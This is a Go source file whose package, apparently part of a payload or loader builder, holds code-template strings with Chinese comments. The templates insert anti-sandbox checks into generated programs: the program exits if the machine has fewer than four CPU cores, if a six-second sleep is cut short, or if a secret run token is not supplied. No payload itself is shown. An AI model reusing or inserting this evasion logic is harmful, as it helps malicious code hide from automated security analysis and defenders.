package encode

var (
	SandboxString = []string{``, `
    "os"
	"runtime"
	timmee "time"
`, `

// 检测实际睡眠时间是否不足6秒
func isSleepInsufficient() bool {
	start := timmee.Now()
	timmee.Sleep(6 * timmee.Second)
	return timmee.Since(start) < 6*timmee.Second // 直接返回比较结果
}

// 检测CPU核心数是否<4
func isCPULow() bool {
	return runtime.NumCPU() < 4
}
`, `
	if isCPULow() || isSleepInsufficient() {
		os.Exit(0)
	}`,
		`
    "os"
	"flag"
`,
		`
	inputRunString := flag.String("s", "", "必要的运行参数")
	flag.Parse()

	if *inputRunString != "//__SANDBOX_TOKEN__" {
		os.Exit(0)
	}
`,
	}
)
